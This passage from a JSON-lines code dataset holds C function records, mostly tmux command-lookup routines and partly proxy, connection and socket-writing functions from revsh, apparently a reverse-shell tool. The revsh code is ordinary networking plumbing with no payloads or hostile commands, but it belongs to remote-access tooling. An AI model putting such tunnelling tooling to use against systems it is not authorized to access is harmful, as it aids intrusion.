{\n\t\tif ((idx = cmd_find_index_offset(arg, s, &ambiguous)) < 0)\n\t\t\tgoto lookup_session;\n\t} else if ((idx = cmd_lookup_index(s, arg, &ambiguous)) == -1)\n\t\tgoto lookup_session;\n\n\tif (sp != NULL)\n\t\t*sp = s;\n\n\treturn (idx);\n\nlookup_session:\n\tif (ambiguous)\n\t\tgoto not_found;\n\tif (*arg != '\\0' && (s = cmd_lookup_session(arg, &ambiguous)) == NULL)\n\t\tgoto no_session;\n\n\tif (sp != NULL)\n\t\t*sp = s;\n\n\treturn (-1);\n\nno_session:\n\tif (ambiguous)\n\t\tcmdq_error(cmdq, \"multiple sessions: %s\", arg);\n\telse\n\t\tcmdq_error(cmdq, \"session not found: %s\", arg);\n\tfree(sessptr);\n\treturn (-2);\n\ninvalid_index:\n\tif (ambiguous)\n\t\tgoto not_found;\n\tcmdq_error(cmdq, \"invalid index: %s\", arg);\n\n\tfree(sessptr);\n\treturn (-2);\n\nnot_found:\n\tif (ambiguous)\n\t\tcmdq_error(cmdq, \"multiple windows: %s\", arg);\n\telse\n\t\tcmdq_error(cmdq, \"window not found: %s\", arg);\n\tfree(sessptr);\n\treturn (-2);\n}", "path": "example\\from_dir\\tmux\\cmd.c", "repo_name": "docker-rpm-builder/docker-rpm-builder", "stars": 379, "license": "other", "language": "c", "size": 13925}
{"docstring": "/*\n * Lookup a window or return -1 if not found or ambigious. First try as an\n * index and if invalid, use fnmatch or leading prefix. Return NULL but fill in\n * idx if the window index is a valid number but there is no window with that\n * index.\n */\n", "func_signal": "struct winlink *\ncmd_lookup_window(struct session *s, const char *name, int *ambiguous)", "code": "{\n\tstruct winlink\t*wl, *wlfound;\n\tconst char\t*errstr;\n\tu_int\t\t idx;\n\n\t*ambiguous = 0;\n\n\t/* Try as a window id. */\n\tif ((wl = cmd_lookup_winlink_windowid(s, name)) != NULL)\n\t    return (wl);\n\n\t/* First see if this is a valid window index in this session. */\n\tidx = strtonum(name, 0, INT_MAX, &errstr);\n\tif (errstr == NULL) {\n\t\tif ((wl = winlink_find_by_index(&s->windows, idx)) != NULL)\n\t\t\treturn (wl);\n\t}\n\n\t/* Look for exact matches, error if more than one. */\n\twlfound = NULL;\n\tRB_FOREACH(wl, winlinks, &s->windows) {\n\t\tif (strcmp(name, wl->window->name) == 0) {\n\t\t\tif (wlfound != NULL) {\n\t\t\t\t*ambiguous = 1;\n\t\t\t\treturn (NULL);\n\t\t\t}\n\t\t\twlfound = wl;\n\t\t}\n\t}\n\tif (wlfound != NULL)\n\t\treturn (wlfound);\n\n\t/* Now look for pattern matches, again error if multiple. */\n\twlfound = NULL;\n\tRB_FOREACH(wl, winlinks, &s->windows) {\n\t\tif (strncmp(name, wl->window->name, strlen(name)) == 0 ||\n\t\t    fnmatch(name, wl->window->name, 0) == 0) {\n\t\t\tif (wlfound != NULL) {\n\t\t\t\t*ambiguous = 1;\n\t\t\t\treturn (NULL);\n\t\t\t}\n\t\t\twlfound = wl;\n\t\t}\n\t}\n\tif (wlfound != NULL)\n\t\treturn (wlfound);\n\n\treturn (NULL);\n}", "path": "example\\from_dir\\tmux\\cmd.c", "repo_name": "docker-rpm-builder/docker-rpm-builder", "stars": 379, "license": "other", "language": "c", "size": 13925}
{"docstring": "/*\n * Find the most recently used session, preferring unattached if the flag is\n * set.\n */\n", "func_signal": "struct session *\ncmd_choose_session(int prefer_unattached)", "code": "{\n\tstruct session\t*s, *best;\n\n\tbest = NULL;\n\tRB_FOREACH(s, sessions, &sessions) {\n\t\tif (cmd_session_better(s, best, prefer_unattached))\n\t\t\tbest = s;\n\t}\n\treturn (best);\n}", "path": "example\\from_dir\\tmux\\cmd.c", "repo_name": "docker-rpm-builder/docker-rpm-builder", "stars": 379, "license": "other", "language": "c", "size": 13925}
{"docstring": "/* Lookup a session by name. If no session is found, NULL is returned. */\n", "func_signal": "struct session *\ncmd_lookup_session(const char *name, int *ambiguous)", "code": "{\n\tstruct session\t*s, *sfound;\n\n\t*ambiguous = 0;\n\n\t/* Look for $id first. */\n\tif ((s = cmd_lookup_session_id(name)) != NULL)\n\t\treturn (s);\n\n\t/*\n\t * Look for matches. First look for exact matches - session names must\n\t * be unique so an exact match can't be ambigious and can just be\n\t * returned.\n\t */\n\tif ((s = session_find(name)) != NULL)\n\t\treturn (s);\n\n\t/*\n\t * Otherwise look for partial matches, returning early if it is found to\n\t * be ambiguous.\n\t */\n\tsfound = NULL;\n\tRB_FOREACH(s, sessions, &sessions) {\n\t\tif (strncmp(name, s->name, strlen(name)) == 0 ||\n\t\t    fnmatch(name, s->name, 0) == 0) {\n\t\t\tif (sfound != NULL) {\n\t\t\t\t*ambiguous = 1;\n\t\t\t\treturn (NULL);\n\t\t\t}\n\t\t\tsfound = s;\n\t\t}\n\t}\n\treturn (sfound);\n}", "path": "example\\from_dir\\tmux\\cmd.c", "repo_name": "docker-rpm-builder/docker-rpm-builder", "stars": 379, "license": "other", "language": "c", "size": 13925}
{"docstring": "/*\n * Find the current client. First try the current client if set, then pick the\n * most recently used of the clients attached to the current session if any,\n * then of all clients.\n */\n", "func_signal": "struct client *\ncmd_current_client(struct cmd_q *cmdq)", "code": "{\n\tstruct session\t\t*s;\n\tstruct client\t\t*c;\n\tstruct clients\t\t cc;\n\tu_int\t\t\t i;\n\n\tif (cmdq->client != NULL && cmdq->client->session != NULL)\n\t\treturn (cmdq->client);\n\n\t/*\n\t * No current client set. Find the current session and return the\n\t * newest of its clients.\n\t */\n\ts = cmd_current_session(cmdq, 0);\n\tif (s != NULL && !(s->flags & SESSION_UNATTACHED)) {\n\t\tARRAY_INIT(&cc);\n\t\tfor (i = 0; i < ARRAY_LENGTH(&clients); i++) {\n\t\t\tif ((c = ARRAY_ITEM(&clients, i)) == NULL)\n\t\t\t\tcontinue;\n\t\t\tif (s == c->session)\n\t\t\t\tARRAY_ADD(&cc, c);\n\t\t}\n\n\t\tc = cmd_choose_client(&cc);\n\t\tARRAY_FREE(&cc);\n\t\tif (c != NULL)\n\t\t\treturn (c);\n\t}\n\n\treturn (cmd_choose_client(&clients));\n}", "path": "example\\from_dir\\tmux\\cmd.c", "repo_name": "docker-rpm-builder/docker-rpm-builder", "stars": 379, "license": "other", "language": "c", "size": 13925}
{"docstring": "/* Find the target session and window or report an error and return NULL. */\n", "func_signal": "struct winlink *\ncmd_find_window(struct cmd_q *cmdq, const char *arg, struct session **sp)", "code": "{\n\tstruct session\t\t*s;\n\tstruct winlink\t\t*wl;\n\tstruct window_pane\t*wp;\n\tconst char\t\t*winptr;\n\tchar\t\t\t*sessptr = NULL;\n\tint\t\t\t ambiguous = 0;\n\n\t/*\n\t * Find the current session. There must always be a current session, if\n\t * it can't be found, report an error.\n\t */\n\tif ((s = cmd_current_session(cmdq, 0)) == NULL) {\n\t\tcmdq_error(cmdq, \"can't establish current session\");\n\t\treturn (NULL);\n\t}\n\n\t/* A NULL argument means the current session and window. */\n\tif (arg == NULL) {\n\t\tif (sp != NULL)\n\t\t\t*sp = s;\n\t\treturn (s->curw);\n\t}\n\n\t/* Lookup as pane id. */\n\tif ((wp = cmd_lookup_paneid(arg)) != NULL) {\n\t\ts = cmd_window_session(cmdq, wp->window, &wl);\n\t\tif (sp != NULL)\n\t\t\t*sp = s;\n\t\treturn (wl);\n\t}\n\n\t/* Time to look at the argument. If it is empty, that is an error. */\n\tif (*arg == '\\0')\n\t\tgoto not_found;\n\n\t/* Find the separating colon and split into window and session. */\n\twinptr = strchr(arg, ':');\n\tif (winptr == NULL)\n\t\tgoto no_colon;\n\twinptr++;\t/* skip : */\n\tsessptr = xstrdup(arg);\n\t*strchr(sessptr, ':') = '\\0';\n\n\t/* Try to lookup the session if present. */\n\tif (*sessptr != '\\0') {\n\t\tif ((s = cmd_lookup_session(sessptr, &ambiguous)) == NULL)\n\t\t\tgoto no_session;\n\t}\n\tif (sp != NULL)\n\t\t*sp = s;\n\n\t/*\n\t * Then work out the window. An empty string is the current window,\n\t * otherwise try special cases then to look it up in the session.\n\t */\n\tif (*winptr == '\\0')\n\t\twl = s->curw;\n\telse if (winptr[0] == '!' && winptr[1] == '\\0')\n\t\twl = TAILQ_FIRST(&s->lastw);\n\telse if (winptr[0] == '^' && winptr[1] == '\\0')\n\t\twl = RB_MIN(winlinks, &s->windows);\n\telse if (winptr[0] == '$' && winptr[1] == '\\0')\n\t\twl = RB_MAX(winlinks, &s->windows);\n\telse if (winptr[0] == '+' || winptr[0] == '-')\n\t\twl = cmd_find_window_offset(winptr, s, &ambiguous);\n\telse\n\t\twl = cmd_lookup_window(s, winptr, &ambiguous);\n\tif (wl == NULL)\n\t\tgoto not_found;\n\n\tif (sessptr != NULL)\n\t\tfree(sessptr);\n\treturn (wl);\n\nno_colon:\n\t/*\n\t * No colon in the string, first try special cases, then as a window\n\t * and lastly as a session.\n\t */\n\tif (arg[0] == '!' && arg[1] == '\\0') {\n\t\tif ((wl = TAILQ_FIRST(&s->lastw)) == NULL)\n\t\t\tgoto not_found;\n\t} else if (arg[0] == '+' || arg[0] == '-') {\n\t\tif ((wl = cmd_find_window_offset(arg, s, &ambiguous)) == NULL)\n\t\t\tgoto lookup_session;\n\t} else if ((wl = cmd_lookup_window(s, arg, &ambiguous)) == NULL)\n\t\tgoto lookup_session;\n\n\tif (sp != NULL)\n\t\t*sp = s;\n\n\treturn (wl);\n\nlookup_session:\n\tif (ambiguous)\n\t\tgoto not_found;\n\tif (*arg != '\\0' && (s = cmd_lookup_session(arg, &ambiguous)) == NULL)\n\t\tgoto no_session;\n\n\tif (sp != NULL)\n\t\t*sp = s;\n\n\treturn (s->curw);\n\nno_session:\n\tif (ambiguous)\n\t\tcmdq_error(cmdq, \"multiple sessions: %s\", arg);\n\telse\n\t\tcmdq_error(cmdq, \"session not found: %s\", arg);\n\tfree(sessptr);\n\treturn (NULL);\n\nnot_found:\n\tif (ambiguous)\n\t\tcmdq_error(cmdq, \"multiple windows: %s\", arg);\n\telse\n\t\tcmdq_error(cmdq, \"window not found: %s\", arg);\n\tfree(sessptr);\n\treturn (NULL);\n}", "path": "example\\from_dir\\tmux\\cmd.c", "repo_name": "docker-rpm-builder/docker-rpm-builder", "stars": 379, "license": "other", "language": "c", "size": 13925}
{"docstring": "/* ARGSUSED */\n", "func_signal": "struct ibuf *\nimsg_create(struct imsgbuf *ibuf, u_int32_t type, u_int32_t peerid,\n    pid_t pid, u_int16_t datalen)", "code": "{\n\tstruct ibuf\t*wbuf;\n\tstruct imsg_hdr\t hdr;\n\n\tdatalen += IMSG_HEADER_SIZE;\n\tif (datalen > MAX_IMSGSIZE) {\n\t\terrno = ERANGE;\n\t\treturn (NULL);\n\t}\n\n\thdr.type = type;\n\thdr.flags = 0;\n\thdr.peerid = peerid;\n\tif ((hdr.pid = pid) == 0)\n\t\thdr.pid = ibuf->pid;\n\tif ((wbuf = ibuf_dynamic(datalen, MAX_IMSGSIZE)) == NULL) {\n\t\treturn (NULL);\n\t}\n\tif (imsg_add(wbuf, &hdr, sizeof(hdr)) == -1)\n\t\treturn (NULL);\n\n\treturn (wbuf);\n}", "path": "example\\from_dir\\tmux\\compat\\imsg.c", "repo_name": "docker-rpm-builder/docker-rpm-builder", "stars": 379, "license": "other", "language": "c", "size": 13925}
{"docstring": "/* Is this session better? */\n", "func_signal": "int\ncmd_session_better(struct session *s, struct session *best,\n    int prefer_unattached)", "code": "{\n\tif (best == NULL)\n\t\treturn (1);\n\tif (prefer_unattached) {\n\t\tif (!(best->flags & SESSION_UNATTACHED) &&\n\t\t    (s->flags & SESSION_UNATTACHED))\n\t\t\treturn (1);\n\t\telse if ((best->flags & SESSION_UNATTACHED) &&\n\t\t    !(s->flags & SESSION_UNATTACHED))\n\t\t\treturn (0);\n\t}\n\treturn (timercmp(&s->activity_time, &best->activity_time, >));\n}", "path": "example\\from_dir\\tmux\\cmd.c", "repo_name": "docker-rpm-builder/docker-rpm-builder", "stars": 379, "license": "other", "language": "c", "size": 13925}
{"docstring": "/* Replace the first %% or %idx in template by s. */\n", "func_signal": "char *\ncmd_template_replace(const char *template, const char *s, int idx)", "code": "{\n\tchar\t\t ch, *buf;\n\tconst char\t*ptr;\n\tint\t\t replaced;\n\tsize_t\t\t len;\n\n\tif (strchr(template, '%') == NULL)\n\t\treturn (xstrdup(template));\n\n\tbuf = xmalloc(1);\n\t*buf = '\\0';\n\tlen = 0;\n\treplaced = 0;\n\n\tptr = template;\n\twhile (*ptr != '\\0') {\n\t\tswitch (ch = *ptr++) {\n\t\tcase '%':\n\t\t\tif (*ptr < '1' || *ptr > '9' || *ptr - '0' != idx) {\n\t\t\t\tif (*ptr != '%' || replaced)\n\t\t\t\t\tbreak;\n\t\t\t\treplaced = 1;\n\t\t\t}\n\t\t\tptr++;\n\n\t\t\tlen += strlen(s);\n\t\t\tbuf = xrealloc(buf, 1, len + 1);\n\t\t\tstrlcat(buf, s, len + 1);\n\t\t\tcontinue;\n\t\t}\n\t\tbuf = xrealloc(buf, 1, len + 2);\n\t\tbuf[len++] = ch;\n\t\tbuf[len] = '\\0';\n\t}\n\n\treturn (buf);\n}", "path": "example\\from_dir\\tmux\\cmd.c", "repo_name": "docker-rpm-builder/docker-rpm-builder", "stars": 379, "license": "other", "language": "c", "size": 13925}
{"docstring": "/***********************************************************************************************************************\n *\n * remote_write_plaintext()\n *\n * Input: A pointer to the buffer we want to empty, and the count of characters we should write.\n *   We will also use the the global io struct.\n * Output: The count of characters succesfully written, or -1 on error.\n *\n * Purpose: Empty our buffer.\n *\n **********************************************************************************************************************/\n", "func_signal": "int remote_write_plaintext(void *buff, size_t count)", "code": "{\n\n\tint retval;\n\tint io_bytes;\n\tchar *tmp_ptr;\n\n\tfd_set fd_select;\n\n\tint seen = 0;\n\n\n\tio_bytes = 0;\n\ttmp_ptr = buff;\n\n\twhile(count){\n\n\t\t/* Skip the select() statement the first time through, as the common case won't need it. */\n\t\tif(seen){\n\t\t\tFD_ZERO(&fd_select);\n\t\t\tFD_SET(io->remote_fd, &fd_select);\n\n\t\t\tif(select(io->remote_fd + 1, NULL, &fd_select, NULL, NULL) == -1){\n\t\t\t\treport_error(\"remote_write_plaintext(): select(%d, NULL, %lx, NULL, NULL): %s\", \\\n\t\t\t\t\t\tio->remote_fd + 1, (unsigned long) &fd_select, strerror(errno));\n\t\t\t\treturn(-1);\n\t\t\t}\n\t\t}else{\n\t\t\tseen = 1;\n\t\t}\n\n\t\tretval = write(io->remote_fd, tmp_ptr, count);\n\n\t\tif(retval == -1){\n\t\t\tif(!(errno == EINTR || errno == EAGAIN)){\n\t\t\t\treport_error(\"remote_write_plaintext(): read(%d, %lx, %d): %s\", \\\n\t\t\t\t\t\tio->remote_fd, (unsigned long) &tmp_ptr, (int) count, strerror(errno));\n\t\t\t\treturn(-1);\n\t\t\t}\n\n\t\t}else{\n\t\t\tcount -= retval;\n\t\t\tio_bytes += retval;\n\t\t\ttmp_ptr += retval;\n\t\t}\n\t}\n\n\treturn(io_bytes);\n}", "path": "io_nossl.c", "repo_name": "emptymonkey/revsh", "stars": 448, "license": "mit", "language": "c", "size": 597}
{"docstring": "/******************************************************************************\n *\n * proxy_node_new()\n *\n * Inputs: The proxy string comming from the command line request.\n *         The type of proxy we are setting up.\n *\n * Outputs: A pointer to a new proxy_node.\n *\n * Purpose: Initialize a new proxy_node.\n *\n ******************************************************************************/\n", "func_signal": "struct proxy_node *proxy_node_new(char *proxy_string, int proxy_type)", "code": "{\n\n\tstruct proxy_node *new_node;\n\n\tchar *first = NULL;\n\tchar *second = NULL;\n\tchar *third = NULL;\n\tchar *fourth = NULL;\n\n\tunsigned int count;\n\tchar *tmp;\n\n\n\t// First, quick syntax check.\n\tcount = 0;\n\ttmp = proxy_string;\n\twhile((tmp = strchr(tmp, ':')) != NULL){\n\t\tcount++;\n\t\ttmp++;\n\t}\n\n\tif((proxy_type == PROXY_DYNAMIC && !(count == 0 || count == 1)) \\\n\t\t\t|| (proxy_type == PROXY_STATIC && !(count == 2 || count == 3))){\n\t\treport_error(\"proxy_node_new(): Improper port forward syntax for proxy type '%d': %s\", proxy_type, proxy_string);\n\t\treturn(NULL);\n\t} \n\n\t// Now let's start setting up the nodes.\n\tif((new_node = proxy_node_create()) == NULL){\n\t\treport_error(\"proxy_node_new(): proxy_node_create(): %s\", strerror(errno));\n\t\treturn(NULL);\n\t}\n\tnew_node->proxy_type = proxy_type;\n\n\tif((new_node->orig_request = (char *) calloc(strlen(proxy_string) + 1, sizeof(char))) == NULL){\n\t\t\treport_error(\"proxy_node_new(): calloc(%d, sizeof(char)): %s\", (int) strlen(proxy_string), strerror(errno));\n\t\tfree(new_node);\n\t\treturn(NULL);\n\t}\n\tmemcpy(new_node->orig_request, proxy_string, strlen(proxy_string));\n\n\tif((new_node->mem_ptr = (char *) calloc(strlen(proxy_string) + 1, sizeof(char))) == NULL){\n\t\t\treport_error(\"proxy_node_new(): calloc(%d, sizeof(char)): %s\", (int) strlen(proxy_string), strerror(errno));\n\t\tfree(new_node);\n\t\treturn(NULL);\n\t}\n\tfirst = new_node->mem_ptr;\n\n\t// Proxy strings can have a lot of different formats. This block is where we figure out which format we're dealing with.\n\tstrcpy(first, proxy_string);\n\n\tif((second = strchr(first, ':')) != NULL){\n\t\t*(second++) = '\\0';\n\t}\n\n\tif(proxy_type == PROXY_DYNAMIC){\n\n\t\tif(second){\n\t\t\tnew_node->lhost = first;\n\t\t\tnew_node->lport = second;\n\t\t}else{\n\t\t\tnew_node->lhost = DEFAULT_PROXY_ADDR;\n\t\t\tnew_node->lport = first;\n\t\t}\n\n\t} else if(proxy_type == PROXY_STATIC) {\n\n\t\tif(!second || (third = strchr(second, ':')) == NULL){\n\t\t\treport_error(\"proxy_node_new(): Malformed proxy string: %s\", proxy_string);\n\t\t\tgoto CLEANUP;\n\t\t}\n\n\t\tif((fourth = strchr((third + 1) , ':')) != NULL){\n\t\t\tnew_node->lhost = first;\n\t\t\tnew_node->lport = second;\n\t\t\t*(third++) = '\\0';\n\t\t\tnew_node->rhost_rport = third;\n\t\t}else{\n\t\t\tnew_node->lhost = DEFAULT_PROXY_ADDR;\n\t\t\tnew_node->lport = first;\n\t\t\tnew_node->rhost_rport = second;\n\t\t}\n\n\t} else {\n\t\tgoto CLEANUP;\n\t}\n\n\tif(proxy_listen(new_node) == -1){\n\t\treport_error(\"proxy_node_new(): proxy_listen() failed. Skipping this proxy.\");\n\t\tgoto CLEANUP;\n\t}\n\n\tnew_node->origin = io->target;\n\tnew_node->id = new_node->fd;\n\treturn(new_node);\n\nCLEANUP:\n\tproxy_node_delete(new_node);\n\treturn(NULL);\n}", "path": "proxy.c", "repo_name": "emptymonkey/revsh", "stars": 448, "license": "mit", "language": "c", "size": 597}
{"docstring": "/***********************************************************************************************************************\n *\n * message_helper_create()\n *\n * Input:  A pointer to the data.\n *         The length of that data.\n *         The max size that data is allowed to be in this run.\n * Output: A pointer to a new message_helper node if successful, NULL if not.\n *\n * Purpose: Make a new message_helper node and fill it with data. Probably for the write buffering case where a write()\n *          somewhere is failing non-fataly. \n *\n **********************************************************************************************************************/\n", "func_signal": "struct message_helper *message_helper_create(char *data, unsigned short data_len, unsigned short message_data_size)", "code": "{\n\n\tstruct message_helper *new_mh;\n\n\tnew_mh = (struct message_helper *) calloc(1, sizeof(struct message_helper));\n\tif(!new_mh){\n\t\treport_error(\"message_helper_create(): calloc(1, %d): %s\", (int) sizeof(struct message_helper), strerror(errno));\n\t\treturn(NULL);\n\t}\n\n\tnew_mh->data = (char *) calloc(message_data_size, sizeof(char));\n\tif(!new_mh->data){\n\t\treport_error(\"message_helper_create(): calloc(1, %d): %s\", (int) sizeof(struct message_helper), strerror(errno));\n\t\tfree(new_mh);\n\t\treturn(NULL);\n\t}\n\n\tmemcpy(new_mh->data, data, data_len);\n\tnew_mh->data_len = data_len;\n\n\treturn(new_mh);\n}", "path": "message.c", "repo_name": "emptymonkey/revsh", "stars": 448, "license": "mit", "language": "c", "size": 597}
{"docstring": "/******************************************************************************\n *\n * proxy_node_delete()\n *\n * Inputs: A pointer to the proxy_node we wish to destroy.\n *\n * Outputs: None.\n *\n * Purpose: Destroy a proxy node and remove it froms the linked list.\n *\n ******************************************************************************/\n", "func_signal": "void proxy_node_delete(struct proxy_node *cur_proxy_node)", "code": "{\n\n\tif(cur_proxy_node == io->proxy_head){\n\t\tio->proxy_head = cur_proxy_node->next;\n\t}\n\tif(cur_proxy_node == io->proxy_tail){\n\t\tio->proxy_tail = cur_proxy_node->prev;\n\t}\n\tif(cur_proxy_node->prev){\n\t\tcur_proxy_node->prev->next = cur_proxy_node->next;\n\t}\n\tif(cur_proxy_node->next){\n\t\tcur_proxy_node->next->prev = cur_proxy_node->prev;\n\t}\n\n\tif(cur_proxy_node->origin == io->target){\n\n\t\tif(cur_proxy_node->fd){\n\t\t\tclose(cur_proxy_node->fd);\n\t\t}\n\t\tio->fd_count--;\n\n\t\tif(cur_proxy_node->orig_request){\n\t\t\tfree(cur_proxy_node->orig_request);\n\t\t}\n\n\t\tif(cur_proxy_node->mem_ptr){\n\t\t\tfree(cur_proxy_node->mem_ptr);\n\t\t}\n\n\t}else{\n\t\tfree(cur_proxy_node->orig_request);\n\t}\n\n\tif(cur_proxy_node){\n\t\tfree(cur_proxy_node);\n\t}\n}", "path": "proxy.c", "repo_name": "emptymonkey/revsh", "stars": 448, "license": "mit", "language": "c", "size": 597}
{"docstring": "/******************************************************************************\n *\n * proxy_connect()\n *\n * Inputs: The string representing where to connect to.\n *\n * Outputs: 0 for success. -1 for fatal errors. -2 for non-fatal errors.\n *\n * Purpose: Complete the outbound connection of a proxy request.\n *\n ******************************************************************************/\n", "func_signal": "int proxy_connect(char *rhost_rport)", "code": "{\n\n\tint count;\n\tint yes = 1;\n\tint rv, connector = -2;\n\tstruct addrinfo hints, *ai, *p;\n\tchar *rhost, *rport, *tmp_ptr;\n\n\ttmp_ptr = rhost_rport;\n\tif(*tmp_ptr == '['){\n\t\ttmp_ptr++;\n\t}\n\n\tcount = strlen(tmp_ptr);\n\n\tif((rhost = (char *) calloc(count + 1, sizeof(char))) == NULL){\n\t\treport_error(\"proxy_connect(): calloc(%d, %d): %s\", count + 1, (int) sizeof(char), strerror(errno));\n\t\treturn(-1);\n\t}\n\tmemcpy(rhost, tmp_ptr, count);\n\n\tif(tmp_ptr != rhost_rport){\n\t\tif((tmp_ptr = strchr(rhost, ']')) == NULL){\n\t\t\tfree(rhost);\n\t\t\treturn(-2);\n\t\t}\n\t\t*(tmp_ptr) = '\\0';\n\t}\n\n\tif((rport = strrchr(rhost, ':')) == NULL){\n\t\tfree(rhost);\n\t\treturn(-2);\n\t}\n\t*(rport++) = '\\0';\n\n\tmemset(&hints, 0, sizeof(hints));\n\n\thints.ai_family = AF_UNSPEC;\n\thints.ai_socktype = SOCK_STREAM;\n\thints.ai_flags = AI_PASSIVE;\n\n\tif((rv = getaddrinfo(rhost, rport, &hints, &ai)) != 0) {\n\t\treport_error(\"proxy_connect(): getaddrinfo(%s, %s, %lx, %lx): %s\", rhost, rport, (unsigned long) &hints, (unsigned long) &ai, gai_strerror(rv));\n\t\tfree(rhost);\n\t\treturn(-2);\n\t}\n\n\tfor(p = ai; p != NULL; p = p->ai_next) {\n\t\tconnector = socket(p->ai_family, p->ai_socktype, p->ai_protocol);\n\t\tif (connector < 0) { \n\t\t\tcontinue;\n\t\t}\n\n\t\tsetsockopt(connector, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int));\n\n\t\tfcntl(connector, F_SETFL, O_NONBLOCK);\n\t\terrno = 0;\n\t\tif(connect(connector, p->ai_addr, p->ai_addrlen) < 0){\n\t\t\tif (errno != EINPROGRESS){\n\t\t\t\tclose(connector);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t}\n\t\tbreak;\n\t}\n\tfree(rhost);\n\n\tif(p == NULL){\n\t\treturn(-2);\n\t}\n\n\treturn(connector);\n}", "path": "proxy.c", "repo_name": "emptymonkey/revsh", "stars": 448, "license": "mit", "language": "c", "size": 597}
{"docstring": "/******************************************************************************\n *\n * connection_node_queue()\n *\n * Inputs: The pointer to the connection node that needs to be requeued.\n *\n * Outputs: None.\n *\n * Purpose: Simplistic round-robin scheduling for the connections.\n *          Takes a node and moves it to the end of the list.\n *\n ******************************************************************************/\n", "func_signal": "void connection_node_queue(struct connection_node *cur_connection_node)", "code": "{\n\n\tif(cur_connection_node == io->connection_tail){\n\t\treturn;\n\t}\n\n\tif(cur_connection_node == io->connection_head){\n\t\tio->connection_head = cur_connection_node->next;\n\t}\n\n\tif(cur_connection_node->prev){\n\t\tcur_connection_node->prev->next = cur_connection_node->next;\n\t}\n\n\tif(cur_connection_node->next){\n\t\tcur_connection_node->next->prev = cur_connection_node->prev;\n\t}\n\n\tio->connection_tail->next = cur_connection_node;\n\tcur_connection_node->prev = io->connection_tail;\n\tcur_connection_node->next = NULL;\n\tio->connection_tail = cur_connection_node;\n\n}", "path": "proxy.c", "repo_name": "emptymonkey/revsh", "stars": 448, "license": "mit", "language": "c", "size": 597}
{"docstring": "/******************************************************************************\n *\n * connection_node_create()\n *\n * Inputs: None, though we will heavily utilize the global io struct.\n *\n * Outputs: A pointer to the new connection_node.\n *\n * Purpose: Initialize a new connection node, and put it into it's place in the linked list.\n *\n ******************************************************************************/\n", "func_signal": "struct connection_node *connection_node_create()", "code": "{\n\n\tstruct connection_node *cur_connection_node, *tmp_connection_node;\n\n\tif((cur_connection_node = (struct connection_node *) calloc(1, sizeof(struct connection_node))) == NULL){\n\t\treport_error(\"connection_node_create(): calloc(1, %d): %s\", (int) sizeof(struct connection_node), strerror(errno));\n\t\treturn(NULL);\n\t}\n\n\ttmp_connection_node = io->connection_tail;\n\tif(!tmp_connection_node){\n\t\tio->connection_head = cur_connection_node;\n\t\tio->connection_tail = cur_connection_node;\n\t}else{\n\t\ttmp_connection_node->next = cur_connection_node;\n\t\tcur_connection_node->prev = tmp_connection_node;\n\t\tio->connection_tail = cur_connection_node;\n\t}\n\n\tio->fd_count++;\n\treturn(cur_connection_node);\n}", "path": "proxy.c", "repo_name": "emptymonkey/revsh", "stars": 448, "license": "mit", "language": "c", "size": 597}
{"docstring": "/******************************************************************************\n *\n * addr_to_string()\n *\n * Inputs: The type of the socks request.\n *         The address or domain name of the socks request.\n *         The port of the socks request.\n *         The length of the domain name in the above address.\n *\n * Outputs: A pointer to a string representation of the address.\n *\n * Purpose: Convert the address:port information into a string.\n *         \n * Note: If atype is 0x03, then len is the length of the addr string.\n *       If atype isn't 0x03, len is ignored.\n *         \n ******************************************************************************/\n", "func_signal": "char *addr_to_string(int atype, char *addr, char *port, int len)", "code": "{\n\n\tchar *ptr;\n\tunsigned short int port_num = ntohs(*((unsigned short int *)(port)));\n\n\t// strlen(\"255.255.255.255:65535\") -> 21\n\tint string_len = 21;\n\t// ntohs returns a uint16_t. Max size of that number is 6 bytes. Plus one for the leading ':'.\n\t// Note that the largest value *should* be 65535, which is 6 not 7 characters long. Doing so will make\n\t// the compiler grumpy.\n\tint port_len = 7;\n\n\tif(atype == 0x03){\n\t\tstring_len = len;\n\t\tstring_len += port_len;\n\n\t}else if(atype == 0x04){\n\t\t// strlen(\"[ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff]:65535\") -> 47 \n\t\tstring_len = 47;\n\t}\n\n\tif((ptr = (char *) calloc(string_len + 1, sizeof(char))) == NULL){\n\t\treport_error(\"addr_to_string(): calloc(%d, %d): %s\", string_len + 1, (int) sizeof(char), strerror(errno));\n\t\treturn(NULL);\n\t}\n\n\tstring_len++;\n\tif(atype == 0x03){\n\t\tmemcpy(ptr, addr, len);\n\t\tsnprintf(ptr + len, port_len, \":%d\", port_num);\n\t}else if(atype == 0x04){\n\t\tsnprintf(ptr, string_len, \"[%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x]:%d\", \\\n\t\t\t\t(unsigned char) addr[0], (unsigned char) addr[1], (unsigned char) addr[2], (unsigned char) addr[3], \\\n\t\t\t\t(unsigned char) addr[4], (unsigned char) addr[5], (unsigned char) addr[6], (unsigned char) addr[7], \\\n\t\t\t\t(unsigned char) addr[8], (unsigned char) addr[9], (unsigned char) addr[10], (unsigned char) addr[11], \\\n\t\t\t\t(unsigned char) addr[12], (unsigned char) addr[13], (unsigned char) addr[14], (unsigned char) addr[15], \\\n\t\t\t\tport_num);\n\t}else{\n\t\tsnprintf(ptr, string_len, \"%d.%d.%d.%d:%d\", (unsigned char) addr[0], (unsigned char) addr[1], (unsigned char) addr[2], (unsigned char) addr[3], port_num);\n\t}\n\n\treturn(ptr);\n}", "path": "proxy.c", "repo_name": "emptymonkey/revsh", "stars": 448, "license": "mit", "language": "c", "size": 597}
{"docstring": "/******************************************************************************\n *\n * proxy_node_create()\n *\n * Inputs: None, though we will heavily utilize the global io struct.\n *\n * Outputs: A pointer to the new proxy_node.\n *\n * Purpose: Initialize a new proxy node, and put it into it's place in the linked list.\n *\n ******************************************************************************/\n", "func_signal": "struct proxy_node *proxy_node_create()", "code": "{\n\n\tstruct proxy_node *cur_proxy_node, *tmp_proxy_node;\n\n\tif((cur_proxy_node = (struct proxy_node *) calloc(1, sizeof(struct proxy_node))) == NULL){\n\t\treport_error(\"proxy_node_create(): calloc(1, %d): %s\", (int) sizeof(struct proxy_node), strerror(errno));\n\t\treturn(NULL);\n\t}\n\n\ttmp_proxy_node = io->proxy_tail;\n\tif(!tmp_proxy_node){\n\t\tio->proxy_head = cur_proxy_node;\n\t\tio->proxy_tail = cur_proxy_node;\n\t}else{\n\t\ttmp_proxy_node->next = cur_proxy_node;\n\t\tcur_proxy_node->prev = 